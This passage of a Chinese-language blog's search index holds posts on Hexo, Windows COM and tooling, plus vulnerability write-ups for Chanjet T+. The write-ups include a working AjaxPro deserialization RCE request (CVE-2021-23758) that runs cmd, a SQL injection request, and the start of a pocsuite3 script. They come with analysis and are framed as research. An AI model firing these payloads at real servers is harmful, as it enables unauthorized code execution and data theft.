zlibstat_VC2017_x86_MTd 项目或解决方案的一部分。VC2017_x86_MTd 可能表示这是用 Visual Studio 2017 编译的，针对 x86 平台，使用了多线程（MT）调试（d）配置。 通过分析 .map 文件，开发者可以更好地理解程序的内存布局和符号信息，这对于调试和性能分析非常有用。","tags":[{"name":"Visual Studio","slug":"Visual-Studio","permalink":"http://example.com/tags/Visual-Studio/"}],"categories":[{"name":"A_OS","slug":"A-OS","permalink":"http://example.com/categories/A-OS/"},{"name":"Windows","slug":"A-OS/Windows","permalink":"http://example.com/categories/A-OS/Windows/"},{"name":"Visual Studio","slug":"A-OS/Windows/Visual-Studio","permalink":"http://example.com/categories/A-OS/Windows/Visual-Studio/"}]},{"title":"【手册】Hexo draft 使用","date":"2024-04-22T16:00:00.000Z","path":"E_手册/【手册】Hexo draft 使用/","text":"概述：Hexo 使用草稿箱 创建草稿创建草稿需要使用 draft 布局，例如： 12$ hexo new draft &quot;Draft Demo&quot;INFO Created: ~/VScode/blog/source/_drafts/Draft-Demo.md 预览草稿默认情况下，草稿不会显示在页面中，如果想要显示可以在站点配置文件 _config.yml 中把 render_drafts 参数设为 true 来预览草稿。 1render_drafts: true 或者在启动服务器时加上 --draft 参数来预览草稿 1hexo server --draft 发布草稿将草稿文件发布到 _posts 文件夹下 1hexo publish [layout] &lt;title&gt; 例如： 12$ hexo publish post Draft-DemoINFO Published: ~/VScode/blog/source/_posts/Draft-Demo.md","tags":[],"categories":[{"name":"E_手册","slug":"E-手册","permalink":"http://example.com/categories/E-%E6%89%8B%E5%86%8C/"}]},{"title":"【POC】POC 索引","date":"2024-04-17T16:00:00.000Z","path":"A_内功/A_POC探索/【POC】POC 索引/","text":"概述：POC 引路 免责声明：本文所涉及的信息安全技术知识仅供参考和学习之用，并不构成任何明示或暗示的保证。读者在使用本文提供的信息时，应自行判断其适用性，并承担由此产生的一切风险和责任。本文作者对于读者基于本文内容所做出的任何行为或决定不承担任何责任。在任何情况下，本文作者不对因使用本文内容而导致的任何直接、间接、特殊或后果性损失承担责任。读者在使用本文内容时应当遵守当地法律法规，并保证不违反任何相关法律法规。 [toc] 已整理畅捷通CVE-2021-23758 畅捷通反序列化【CVE-2021-23758】Ajax .NET Professional 中的 RCE 漏洞 QVD-2021-13612 畅捷通SQL注入【QVD-2023-13612】畅捷通T+ SQL 注入漏洞 ExchangeCVE-2020-0688【CVE-2020-0688】exchange远程代码执行漏洞复现 开源Your list &#x2F; POC 好文推荐 畅捷通T+任意文件上传(CNVD-2022-60632 )漏洞复现- Track 知识社区 - 掌控安全在线教育 - Powered by 掌控者畅捷通文件结构分析，可执行文件分析","tags":[{"name":"POC","slug":"POC","permalink":"http://example.com/tags/POC/"}],"categories":[{"name":"A_内功","slug":"A-内功","permalink":"http://example.com/categories/A-%E5%86%85%E5%8A%9F/"},{"name":"A_POC探索","slug":"A-内功/A-POC探索","permalink":"http://example.com/categories/A-%E5%86%85%E5%8A%9F/A-POC%E6%8E%A2%E7%B4%A2/"}]},{"title":"【手册】UnSplash 图源API查询手册","date":"2024-04-16T16:00:00.000Z","path":"E_手册/个人配置/【手册】UnSplash 图源API查询手册/","text":"概述：UnSplash 接口快速查询手册 通用接口1https://source.unsplash.com/1280x640/?Technology 支持的分类有： Wallpaper、Nature、People、Architecture、Events、Busines、Experimental、Fashion、Film、Health、Technology、Travel、Textures、Animals、Food、Athletics、Spirituality、Arts、History 随机图片1https://source.unsplash.com/random 指定用户1https://source.unsplash.com/user/&#123;USERNAME&#125; 指定尺寸 123456https://source.unsplash.com/random/&#123;WIDTH&#125;x&#123;HEIGHT&#125;---------------------------------------------------https://source.unsplash.com/random/1280X960https://source.unsplash.com/random/800X600https://source.unsplash.com/random/2560X1920","tags":[{"name":"手册","slug":"手册","permalink":"http://example.com/tags/%E6%89%8B%E5%86%8C/"}],"categories":[{"name":"E_手册","slug":"E-手册","permalink":"http://example.com/categories/E-%E6%89%8B%E5%86%8C/"},{"name":"个人配置","slug":"E-手册/个人配置","permalink":"http://example.com/categories/E-%E6%89%8B%E5%86%8C/%E4%B8%AA%E4%BA%BA%E9%85%8D%E7%BD%AE/"}]},{"title":"【COM】开发经验整理","date":"2024-04-16T16:00:00.000Z","path":"A_OS/Windows/COM/【COM】开发经验整理/","text":"概述：开发中遇到的 COM 异常和相关文章整理 知识点 COM+ 线程模型 文章整理官方文档 COM+（组件服务） - Win32 apps | Microsoft Learn COM+ 上下文和线程模型 - Win32 apps | Microsoft Learn COM+ 线程模型 - Win32 apps | Microsoft Learn 异常创建对象异常CoinitializeEx 返回 0x80010106关键字：COINIT_MULTITHREADED 、COINIT_APARTMENTTHREADED CoInitializeEx返回 “0x80010106“ 或者 “RPC_E_CHANGED_MODE“-CSDN博客","tags":[{"name":"COM","slug":"COM","permalink":"http://example.com/tags/COM/"}],"categories":[{"name":"A_OS","slug":"A-OS","permalink":"http://example.com/categories/A-OS/"},{"name":"Windows","slug":"A-OS/Windows","permalink":"http://example.com/categories/A-OS/Windows/"},{"name":"COM","slug":"A-OS/Windows/COM","permalink":"http://example.com/categories/A-OS/Windows/COM/"}]},{"title":"【CVE-2021-23758】Ajax .NET Professional 中的 RCE 漏洞","date":"2024-04-15T16:00:00.000Z","path":"A_内功/A_POC探索/畅捷通/【CVE-2021-23758】Ajax.NET_Professional_中的RCE漏洞/","text":"概述： CVE-2021-23758 Ajax.NET Professional 中的 RCE 反序列化漏洞分析及说明 免责声明：本文所涉及的信息安全技术知识仅供参考和学习之用，并不构成任何明示或暗示的保证。读者在使用本文提供的信息时，应自行判断其适用性，并承担由此产生的一切风险和责任。本文作者对于读者基于本文内容所做出的任何行为或决定不承担任何责任。在任何情况下，本文作者不对因使用本文内容而导致的任何直接、间接、特殊或后果性损失承担责任。读者在使用本文内容时应当遵守当地法律法规，并保证不违反任何相关法律法规。 漏洞说明Ajax.NET Professional (AjaxPro)是最先把AJAX技术应用在微软.NET环境下框架之一，具有部署简单、使用方便、运行高效等特点； 该框架能够创建一个代理类且可以使客户端的JS代码实现调用服务端的方法，并能返回各种在.NET里使用的类型；使用该框架和直接使用.NET基本无差别。 该漏洞是由于AjaxPro开源组件.NET Class Handler存在对输入数据限制检查不严格引起的；该AjaxPro框架在JavaScriptDeserializer.DeserializeFromJson函数反序列化过程中，如果通过__type获取的Type对象且可对其Type对象修改，攻击者可利用该漏洞在目标主机上执行任意代码。 详见后文分析。 受影响软件畅捷通 T+ GetStoreWarehouseByStore 反序列化漏洞影响版本T+13.0、T+16.0 漏洞说明分析内容在堆栈章节 漏洞主要是因为ajaxPro组件存在 CVE-2021-23758，但是这个漏洞有个要求是传输的参数类型必须是 object 通过反编译 App_Code.dll 的 Ufida.T.CodeBehind._PriorityLevel 中 GetStoreWarehouseByStore 方法满足这个要求 可以看到 GetStoreWarehouseByStore 由[AjaxMethod]修饰，接收一个 object 类型的参数 storeID 所以路径就是 /tplus/ajaxpro/Ufida.T.CodeBehind._PriorityLevel,App_Code.ashx?method=GetStoreWarehouseByStore &#x2F;tplus 是 nginx 的映射路径，&#x2F;ajaxpro&#x2F;* 则是 web.config 中定义的 ajaxPro 组件处理路径 POC执行 POC 会在 tplus 目录下生成 testwhoami.txt 文本 12345678910111213141516171819202122POST /tplus/ajaxpro/Ufida.T.CodeBehind._PriorityLevel,App_Code.ashx?method=GetStoreWarehouseByStore HTTP/1.1Host: localhostUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36X-Ajaxpro-Method: GetStoreWarehouseByStoreAccept: text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2Connection: closeContent-type: application/x-www-form-urlencodedContent-Length: 597&#123; &quot;storeID&quot;:&#123; &quot;__type&quot;:&quot;System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35&quot;, &quot;MethodName&quot;:&quot;Start&quot;, &quot;ObjectInstance&quot;:&#123; &quot;__type&quot;:&quot;System.Diagnostics.Process, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089&quot;, &quot;StartInfo&quot;: &#123; &quot;__type&quot;:&quot;System.Diagnostics.ProcessStartInfo, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089&quot;, &quot;FileName&quot;:&quot;cmd&quot;, &quot;Arguments&quot;:&quot;/c whoami &gt; testwhoami.txt&quot; &#125; &#125; &#125;&#125; 执行结果： 堆栈如上所示POC，可以看到在执行 Arguments 时，ping 命令调用到了 System.Diagnostics.Process.Start 函数。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657 System.dll!System.Diagnostics.Process.Start() (IL=0x0000, Native=0x09963278+0x8) [本机到托管的转换] mscorlib.dll!System.Reflection.RuntimeMethodInfo.UnsafeInvokeInternal(object obj, object[] parameters, object[] arguments) (IL=epilog, Native=0x6A109B90+0xCA) mscorlib.dll!System.Reflection.RuntimeMethodInfo.Invoke(object obj, System.Reflection.BindingFlags invokeAttr, System.Reflection.Binder binder, object[] parameters, System.Globalization.CultureInfo culture) (IL=epilog, Native=0x6A1096E0+0x8E) mscorlib.dll!System.RuntimeType.InvokeMember(string name, System.Reflection.BindingFlags bindingFlags, System.Reflection.Binder binder, object target, object[] providedArgs, System.Reflection.ParameterModifier[] modifiers, System.Globalization.CultureInfo culture, string[] namedParams) (IL≈0x073D, Native=0x6A0CE270+0xAC8) PresentationFramework.dll!System.Windows.Data.ObjectDataProvider.InvokeMethodOnInstance(out System.Exception e) (IL≈0x0025, Native=0x09963000+0x82) PresentationFramework.dll!System.Windows.Data.ObjectDataProvider.QueryWorker(object obj) (IL≈0x008C, Native=0x09962750+0xF5) PresentationFramework.dll!System.Windows.Data.ObjectDataProvider.BeginQuery() (IL=epilog, Native=0x03A4FE18+0xC8) PresentationFramework.dll!System.Windows.Data.ObjectDataProvider.ObjectInstance.set(object value) (IL=epilog, Native=0x09962DB8+0x9B) [本机到托管的转换] mscorlib.dll!System.Reflection.RuntimeMethodInfo.UnsafeInvokeInternal(object obj, object[] parameters, object[] arguments) (IL≈0x0016, Native=0x6A109B90+0x61) mscorlib.dll!System.Reflection.RuntimeMethodInfo.Invoke(object obj, System.Reflection.BindingFlags invokeAttr, System.Reflection.Binder binder, object[] parameters, System.Globalization.CultureInfo culture) (IL=epilog, Native=0x6A1096E0+0x8E) mscorlib.dll!System.Reflection.RuntimePropertyInfo.SetValue(object obj, object value, System.Reflection.BindingFlags invokeAttr, System.Reflection.Binder binder, object[] index, System.Globalization.CultureInfo culture) (IL=epilog, Native=0x6A0EF6E0+0x65) mscorlib.dll!System.Reflection.RuntimePropertyInfo.SetValue(object obj, object value, object[] index) (IL=epilog, Native=0x6A0EF6C0+0x18)&gt; AjaxPro.2.dll!AjaxPro.JavaScriptDeserializer.DeserializeCustomObject(AjaxPro.JavaScriptObject o, System.Type type) (IL≈0x015E, Native=0x03A67FF8+0x311) AjaxPro.2.dll!AjaxPro.JavaScriptDeserializer.Deserialize(AjaxPro.IJavaScriptObject o, System.Type type) (IL≈0x0151, Native=0x00CF5D30+0x2E6) AjaxPro.2.dll!AjaxPro.XmlHttpRequestProcessor.RetreiveParameters() (IL≈0x0180, Native=0x12CA1F98+0x290) AjaxPro.2.dll!AjaxPro.AjaxProcHelper.Run() (IL≈0x01F6, Native=0x12CA0040+0x3B8) AjaxPro.2.dll!AjaxPro.AjaxSyncHttpHandler.ProcessRequest(System.Web.HttpContext context) (IL=0x0010, Native=0x12C7FA58+0x2C) System.Web.dll!System.Web.HttpApplication.CallHandlerExecutionStep.System.Web.HttpApplication.IExecutionStep.Execute() (IL≈0x018D, Native=0x12A84DC0+0x305) System.Web.dll!System.Web.HttpApplication.ExecuteStepImpl(System.Web.HttpApplication.IExecutionStep step) (IL=epilog, Native=0x0E35F2A8+0x6E) System.Web.dll!System.Web.HttpApplication.ExecuteStep(System.Web.HttpApplication.IExecutionStep step, ref bool completedSynchronously) (IL≈0x0015, Native=0x0E35F070+0x4A) System.Web.dll!System.Web.HttpApplication.ApplicationStepManager.ResumeSteps(System.Exception error) (IL≈0x00F6, Native=0x0E35D228+0x1C7) System.Web.dll!System.Web.HttpApplication.System.Web.IHttpAsyncHandler.BeginProcessRequest(System.Web.HttpContext context, System.AsyncCallback cb, object extraData) (IL=0x005C, Native=0x0E35CC68+0xDC) System.Web.dll!System.Web.HttpRuntime.ProcessRequestInternal(System.Web.HttpWorkerRequest wr) (IL≈0x015B, Native=0x06F5CCF0+0x29B) System.Web.dll!System.Web.HttpRuntime.ProcessRequestNoDemand(System.Web.HttpWorkerRequest wr) (IL=epilog, Native=0x06F5A7C0+0x4F) System.Web.dll!System.Web.HttpRuntime.ProcessRequest(System.Web.HttpWorkerRequest wr) (IL=epilog, Native=0x06F5A540+0x31) Chanjet.TP.WebServer.dll!Mono.WebServer.MonoWorkerRequest.ProcessRequest() (IL≈0x000F, Native=0x06F59E20+0x37) Chanjet.TP.WebServer.dll!Mono.WebServer.BaseApplicationHost.ProcessRequest(Mono.WebServer.MonoWorkerRequest mwr) (IL≈0x002A, Native=0x06F59C38+0x5E) Chanjet.TP.WebServer.FastCgi.exe!Mono.WebServer.FastCgi.ApplicationHost.ProcessRequest(Mono.WebServer.FastCgi.Responder responder) (IL=0x0055, Native=0x06F53E50+0x10D) mscorlib.dll!System.Runtime.Remoting.Messaging.StackBuilderSink.SyncProcessMessage(System.Runtime.Remoting.Messaging.IMessage msg) (IL=???, Native=0x6A0D42B0+0x1F4) mscorlib.dll!System.Runtime.Remoting.Messaging.ServerObjectTerminatorSink.SyncProcessMessage(System.Runtime.Remoting.Messaging.IMessage reqMsg) (IL≈0x0048, Native=0x6A0D4238+0x67) mscorlib.dll!System.Runtime.Remoting.Messaging.ServerContextTerminatorSink.SyncProcessMessage(System.Runtime.Remoting.Messaging.IMessage reqMsg) (IL≈0x004F, Native=0x6A0D413C+0x8B) mscorlib.dll!System.Runtime.Remoting.Channels.CrossContextChannel.SyncProcessMessageCallback(object[] args) (IL≈0x0059, Native=0x6A0D3E94+0x98) mscorlib.dll!System.Threading.Thread.CompleteCrossContextCallback(System.Threading.InternalCrossContextDelegate ftnToCall, object[] args) (IL=epilog, Native=0x6A1024F8+0xD) mscorlib.dll!System.Runtime.Remoting.Channels.CrossContextChannel.SyncProcessMessage(System.Runtime.Remoting.Messaging.IMessage reqMsg) (IL≈0x001F, Native=0x6A0D3D40+0xA1) mscorlib.dll!System.Runtime.Remoting.Channels.ChannelServices.SyncDispatchMessage(System.Runtime.Remoting.Messaging.IMessage msg) (IL≈0x0042, Native=0x6A0EAF38+0x93) mscorlib.dll!System.Runtime.Remoting.Channels.CrossAppDomainSink.DoDispatch(byte[] reqStmBuff, System.Runtime.Remoting.Messaging.SmuggledMethodCallMessage smuggledMcm, out System.Runtime.Remoting.Messaging.SmuggledMethodReturnMessage smuggledMrm) (IL≈0x0047, Native=0x6A0D2F50+0xF4) mscorlib.dll!System.Runtime.Remoting.Channels.CrossAppDomainSink.DoTransitionDispatchCallback(object[] args) (IL≈0x0016, Native=0x6A0D77EC+0x84) mscorlib.dll!System.Threading.Thread.CompleteCrossContextCallback(System.Threading.InternalCrossContextDelegate ftnToCall, object[] args) (IL=epilog, Native=0x6A1024F8+0xD) [程序域转换] mscorlib.dll!System.Runtime.Remoting.Channels.CrossAppDomainSink.DoTransitionDispatch(byte[] reqStmBuff, System.Runtime.Remoting.Messaging.SmuggledMethodCallMessage smuggledMcm, out System.Runtime.Remoting.Messaging.SmuggledMethodReturnMessage smuggledMrm) (IL≈0x0002, Native=0x6A0D2E5C+0x7A) mscorlib.dll!System.Runtime.Remoting.Channels.CrossAppDomainSink.SyncProcessMessage(System.Runtime.Remoting.Messaging.IMessage reqMsg) (IL≈0x0053, Native=0x6A0D24AC+0x9A) mscorlib.dll!System.Runtime.Remoting.Proxies.RemotingProxy.CallProcessMessage(System.Runtime.Remoting.Messaging.IMessageSink ms, System.Runtime.Remoting.Messaging.IMessage reqMsg, System.Runtime.Remoting.Contexts.ArrayWithSize proxySinks, System.Threading.Thread currentThread, System.Runtime.Remoting.Contexts.Context currentContext, bool bSkippingContextChain) (IL≈0x003A, Native=0x6A0D22EC+0x51) mscorlib.dll!System.Runtime.Remoting.Proxies.RemotingProxy.InternalInvoke(System.Runtime.Remoting.Messaging.IMethodCallMessage reqMcmMsg, bool useDispatchMessage, int callType) (IL=???, Native=0x6A0D2070+0x1DE) mscorlib.dll!System.Runtime.Remoting.Proxies.RemotingProxy.Invoke(System.Runtime.Remoting.Messaging.IMessage reqMsg) (IL=epilog, Native=0x6A0D2000+0x69) mscorlib.dll!System.Runtime.Remoting.Proxies.RealProxy.PrivateInvoke(ref System.Runtime.Remoting.Proxies.MessageData msgData, int type) (IL≈0x0155, Native=0x6A0D1DA0+0xF4) Chanjet.TP.WebServer.FastCGI.exe!Mono.WebServer.FastCgi.Responder.Process() (IL=0x0068, Native=0x039C3988+0x162) Chanjet.TP.WebServer.FastCGI.exe!Mono.FastCgi.ResponderRequest.Worker(object state) (IL≈0x0002, Native=0x039C37C8+0x4B) mscorlib.dll!System.Threading.QueueUserWorkItemCallback.WaitCallback_Context(object state) (IL=epilog, Native=0x6A0F0960+0x44) mscorlib.dll!System.Threading.ExecutionContext.RunInternal(System.Threading.ExecutionContext executionContext, System.Threading.ContextCallback callback, object state, bool preserveSyncCtx) (IL≈0x0079, Native=0x6A047D70+0xC4) mscorlib.dll!System.Threading.ExecutionContext.Run(System.Threading.ExecutionContext executionContext, System.Threading.ContextCallback callback, object state, bool preserveSyncCtx) (IL=epilog, Native=0x6A047D50+0x17) mscorlib.dll!System.Threading.QueueUserWorkItemCallback.System.Threading.IThreadPoolWorkItem.ExecuteWorkItem() (IL=epilog, Native=0x6A0F09B0+0x45) mscorlib.dll!System.Threading.ThreadPoolWorkQueue.Dispatch() (IL=0x00A4, Native=0x6A0E1920+0x19D) mscorlib.dll!System.Threading._ThreadPoolWaitCallback.PerformWaitCallback() (IL=epilog, Native=0x6A0E1910+0xB) [本机到托管的转换] 如上所示一大堆，只需要关注其中的几个就可以： 12345678AjaxPro.2.dll!AjaxPro.JavaScriptDeserializer.DeserializeCustomObject(AjaxPro.JavaScriptObject o, System.Type type)AjaxPro.2.dll!AjaxPro.JavaScriptDeserializer.Deserialize(AjaxPro.IJavaScriptObject o, System.Type type)AjaxPro.2.dll!AjaxPro.XmlHttpRequestProcessor.RetreiveParameters() AjaxPro.2.dll!AjaxPro.AjaxProcHelper.Run() AjaxPro.2.dll!AjaxPro.AjaxSyncHttpHandler.ProcessRequest(System.Web.HttpContext context) 堆栈&amp;漏漏洞复现从上面分析可知，如果要控制反序列化操作的 Type，那么必须保证 Ajax 处理函数的输出参数类型是可控的，而 GetStoreWarehouseByStore 函数的输入参数为 Objectt 类型，符合当前漏洞要求： 修改请求数据包，加入__type参数，并加入ObjectDataProvider利用链，发送数据包后成功触发RCE。 发送 Ajax 请求后，首先会进入继承于 IHttpHandler 接口的类 AjaxSyncHttpHandler，调用函数 ProcessRequest 进行处理： 接着进入XmlHttpRequestProcessor.RetreiveParameters函数： 其中第23行通过method.GetParameters加载自定义的全部Ajax Method，即所有采用[AjaxPro.AjaxMethod]进行装饰的函数，比如本次漏洞的 GetStoreWarehouseByStore 方法： 上述 parameters 的类型为: &#123;System.Reflection.RuntimeParameterInfo&#125; System.Reflection.ParameterInfo &#123;System.Reflection.RuntimeParameterInfo&#125; 自定义的 方法： ((System.Reflection.RuntimeMethodInfo)parameters[0].MemberImpl).m_name &#x3D; “GetStoreWarehouseByStore” 接着往下走，第120行通过JavaScriptDeserializer.DeserializeFromJson反序列化得到一个JavaScriptObject对象，这里指定了Type类型，继续往下看： 进入 JavaScriptDeserizlizer.Deserializer ： 这里判断是否存在__type参数，如果存在且通过__type获取的Type对象继承于处理函数输入参数数据类型（type.IsAssignableFrom(t)），可以修改反序列化的type对象。继续往下走，最终调用DeserializeCustomObject函数完成处理，处理过程与.NET JavaScriptSerializer等其他反序列化方式非常类似。 在新版本的 AjaxPro.Net 中，对自定义反序列化类型的操作加入了配置限制，只有预先配置好的Type类型才能进行修改，导致恶意类无法被插入。","tags":[{"name":"POC","slug":"POC","permalink":"http://example.com/tags/POC/"},{"name":"漏洞","slug":"漏洞","permalink":"http://example.com/tags/%E6%BC%8F%E6%B4%9E/"}],"categories":[{"name":"A_内功","slug":"A-内功","permalink":"http://example.com/categories/A-%E5%86%85%E5%8A%9F/"},{"name":"A_POC探索","slug":"A-内功/A-POC探索","permalink":"http://example.com/categories/A-%E5%86%85%E5%8A%9F/A-POC%E6%8E%A2%E7%B4%A2/"},{"name":"畅捷通","slug":"A-内功/A-POC探索/畅捷通","permalink":"http://example.com/categories/A-%E5%86%85%E5%8A%9F/A-POC%E6%8E%A2%E7%B4%A2/%E7%95%85%E6%8D%B7%E9%80%9A/"}]},{"title":"【.Net】反序列化漏洞探索","date":"2024-04-15T10:27:03.494Z","path":"B_Code/CSharp/【.Net】反序列化探索/","text":"概述：.Net 反序列及漏洞相关自洽记录。 免责声明：本文所涉及的信息安全技术知识仅供参考和学习之用，并不构成任何明示或暗示的保证。读者在使用本文提供的信息时，应自行判断其适用性，并承担由此产生的一切风险和责任。本文作者对于读者基于本文内容所做出的任何行为或决定不承担任何责任。在任何情况下，本文作者不对因使用本文内容而导致的任何直接、间接、特殊或后果性损失承担责任。读者在使用本文内容时应当遵守当地法律法规，并保证不违反任何相关法律法规。 开源项目和文章推荐项目： Ivan1ee&#x2F;NET-Deserialize: 总结了 20+.Net 反序列化文章，持续更新 文章： 【最新漏洞预警】开源组件漏洞之 CVE-2021-23758 AjaxPro.NET 反序列化漏洞 | CN-SEC 中文网 AjaxPro.NET 反序列化漏洞(CVE-2021-23758)-新华三集团-H3C 反序列化说明在 .NET 中，反序列化漏洞通常是由于不安全地处理序列化的数据而产生的。当应用程序反序列化来自不受信任来源的数据时，攻击者可能会构造恶意的序列化数据，从而在反序列化过程中触发任意代码执行或其他恶意行为。 .NET 框架提供了多种序列化机制，如二进制格式化程序（BinaryFormatter）、SOAP 格式化程序（SoapFormatter）、数据契约序列化程序（DataContractSerializer）等。这些序列化机制在默认情况下可能不安全，因为它们可能允许攻击者利用某些类型的安全漏洞。 .Net 反序列化常见相关函数目前已经有发现的相关反序列漏洞涉及的函数包括但不限于以下所示相关函数： XmlSerializer NetDataContractSerializer FastJson BinaryFormatter Json.Net .Net Remoting SoapFormatter DataContractSerializer LosFormatter ObjectStateFormatter 【.Net】可执行文件结构分析.md JavaScriptSerializer 堆栈实例可查看文章 【CVE-2021-23758】Ajax .NET Professional 中的 RCE 漏洞 中的分析。关键调用如下所示： 12345AjaxPro.2.dll!AjaxPro.JavaScriptDeserializer.DeserializeCustomObject(AjaxPro.JavaScriptObject o, System.Type type) AjaxPro.2.dll!AjaxPro.JavaScriptDeserializer.Deserialize(AjaxPro.IJavaScriptObject o, System.Type type) AjaxPro.2.dll!AjaxPro.XmlHttpRequestProcessor.RetreiveParameters() AjaxPro.2.dll!AjaxPro.AjaxProcHelper.Run() AjaxPro.2.dll!AjaxPro.AjaxSyncHttpHandler.ProcessRequest(System.Web.HttpContext context)","tags":[{"name":".Net","slug":"Net","permalink":"http://example.com/tags/Net/"}],"categories":[{"name":"B_Code","slug":"B-Code","permalink":"http://example.com/categories/B-Code/"},{"name":"CSharp","slug":"B-Code/CSharp","permalink":"http://example.com/categories/B-Code/CSharp/"}]},{"title":"【工具】YaKit 单兵渗透测试工具","date":"2024-04-11T16:00:00.000Z","path":"G_工具/【工具】YaKit 单兵渗透测试工具/","text":"概述：单兵作战渗透工具介绍——Yakit 下载链接下载安装与更新配置 | Yak Program Language 使用探索poc 如何使用渗透测试同居 -&gt; Web Fuzzer -&gt; 把相应的 POC 代码粘贴到 Request 中，然后店家发送请求即可。","tags":[{"name":"工具","slug":"工具","permalink":"http://example.com/tags/%E5%B7%A5%E5%85%B7/"},{"name":"POC","slug":"POC","permalink":"http://example.com/tags/POC/"}],"categories":[{"name":"G_工具","slug":"G-工具","permalink":"http://example.com/categories/G-%E5%B7%A5%E5%85%B7/"}]},{"title":"【批处理】获取 UAC 权限","date":"2024-04-09T09:37:41.349Z","path":"A_OS/Windows/批处理/【批处理】获取uac权限/","text":"概述：批处理获取UAC权限脚本 123456789101112131415161718192021222324252627@echo offif exist &quot;%SystemRoot%\\system32\\atl100.dll&quot; ( ::xcopy atl100.dll D:\\ /-y ::echo &quot;1&quot;) else ( xcopy atl100.dll C:\\Windows\\System32 /-y regsvr32 atl100.dll /n /i )setlocalset uac=~uac_permission_tmp_%random%md &quot;%SystemRoot%\\system32\\%uac%&quot; 2&gt;nulif %errorlevel%==0 ( rd &quot;%SystemRoot%\\system32\\%uac%&quot; &gt;nul 2&gt;nul ) else ( echo set uac = CreateObject^(&quot;Shell.Application&quot;^)&gt;&quot;%temp%\\%uac%.vbs&quot; echo uac.ShellExecute &quot;%~s0&quot;,&quot;&quot;,&quot;&quot;,&quot;runas&quot;,1 &gt;&gt;&quot;%temp%\\%uac%.vbs&quot; echo WScript.Quit &gt;&gt;&quot;%temp%\\%uac%.vbs&quot; &quot;%temp%\\%uac%.vbs&quot; /f del /f /q &quot;%temp%\\%uac%.vbs&quot; &amp; exit )endlocal:Run:: 下面代码替换为自己的regsvr32 &quot;%~dp0%LockKeys.dll&quot;exit","tags":[],"categories":[{"name":"A_OS","slug":"A-OS","permalink":"http://example.com/categories/A-OS/"},{"name":"Windows","slug":"A-OS/Windows","permalink":"http://example.com/categories/A-OS/Windows/"},{"name":"批处理","slug":"A-OS/Windows/批处理","permalink":"http://example.com/categories/A-OS/Windows/%E6%89%B9%E5%A4%84%E7%90%86/"}]},{"title":"【WIN】DeskBand 扫盲","date":"2024-04-09T09:31:12.470Z","path":"A_OS/Windows/Shell扩展/【Win】DeskBand 扫盲/","text":"概述：Windows DeskBand 开发的知识点及项目介绍 [toc] DeskBandDeskBand 指 Windows 操作系统上工具栏按钮，可以通过在工具栏添加按钮来添加一些功能。如下图所示360开发的DeskBand——360U盘助手。 开发说明参考文章： DeskBand实现之——对象介绍-CSDN博客 如何创建开源项目： Windows-classic-samples&#x2F;Samples&#x2F;Win7Samples&#x2F;winui&#x2F;shell&#x2F;shellextensibility&#x2F;deskbands at a47da3d4551b74bb8cc1f4c7447445ac594afb44 · microsoft&#x2F;Windows-classic-samples AzureGreen&#x2F;NetView: a deskband plus-in which can view real-time net speed slivermeteor&#x2F;LockKeys: The windows explorer extension to show the status of Capslock and Numlock in the Taskbar.","tags":[{"name":"Windows","slug":"Windows","permalink":"http://example.com/tags/Windows/"},{"name":"DeskBand","slug":"DeskBand","permalink":"http://example.com/tags/DeskBand/"}],"categories":[{"name":"A_OS","slug":"A-OS","permalink":"http://example.com/categories/A-OS/"},{"name":"Windows","slug":"A-OS/Windows","permalink":"http://example.com/categories/A-OS/Windows/"},{"name":"Shell扩展","slug":"A-OS/Windows/Shell扩展","permalink":"http://example.com/categories/A-OS/Windows/Shell%E6%89%A9%E5%B1%95/"}]},{"title":"【工具】SFTP 工具分享","date":"2024-04-09T06:34:21.903Z","path":"G_工具/【工具】SFTP工具/","text":"概述：用户本地搭建 SFTP 的小工具。 下载链接 链接：https://pan.baidu.com/s/175JTNcqm1lYkenGoDaRkCA?pwd=hi0w提取码：hi0w 使用说明参考文章： 如何在Windows本地快速搭建SFTP文件服务器，并通过端口映射实现公网远程访问-阿里云开发者社区","tags":[],"categories":[{"name":"G_工具","slug":"G-工具","permalink":"http://example.com/categories/G-%E5%B7%A5%E5%85%B7/"}]},{"title":"【QVD-2023-13612】畅捷通T+ SQL 注入漏洞","date":"2024-04-07T00:22:33.512Z","path":"A_内功/A_POC探索/畅捷通/【QVD-2023-13612】畅捷通SQL注入/","text":"概述：畅捷通T+ SQL 注入漏洞(含POC) 免责声明：本文所涉及的信息安全技术知识仅供参考和学习之用，并不构成任何明示或暗示的保证。读者在使用本文提供的信息时，应自行判断其适用性，并承担由此产生的一切风险和责任。本文作者对于读者基于本文内容所做出的任何行为或决定不承担任何责任。在任何情况下，本文作者不对因使用本文内容而导致的任何直接、间接、特殊或后果性损失承担责任。读者在使用本文内容时应当遵守当地法律法规，并保证不违反任何相关法律法规。 [toc] 漏洞说明畅捷通T+SQL注入漏洞，未经身份认证的远程攻击者可在易受攻击系统上执行任意SQL语句，某些情况下攻击者利用该漏洞可在底层操作系统上执行shell命令。 POC畅捷通T+ 13.0 畅捷通T+ 16.0 POCpoc12345678910POST /tplus/ajaxpro/Ufida.T.SM.UIP.MultiCompanyController,Ufida.T.SM.UIP.ashx?method=CheckMutex HTTP/1.1Host: 192.168.19.137:8080User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36Accept: text/css,*/*;q=0.1Accept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q=0.9Connection: closeContent-Length: 53&#123;&quot;accNum&quot;: &quot;3&#x27;and (select @@version)&gt;0--&quot;, &quot;functionTag&quot;: &quot;SYS0104&quot;, &quot;url&quot;: &quot;&quot;&#125; 使用 pocsuit123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293from collections import OrderedDictfrom urllib.parse import urljoinimport refrom pocsuite3.api import Output, POCBase, POC_CATEGORY, register_poc, requests, VUL_TYPEfrom pocsuite3.api import OrderedDict, OptStringfrom urllib3.exceptions import InsecureRequestWarningimport jsonimport osclass ChanJetPOC(POCBase): vulID = &#x27;0&#x27; # ssvid ID 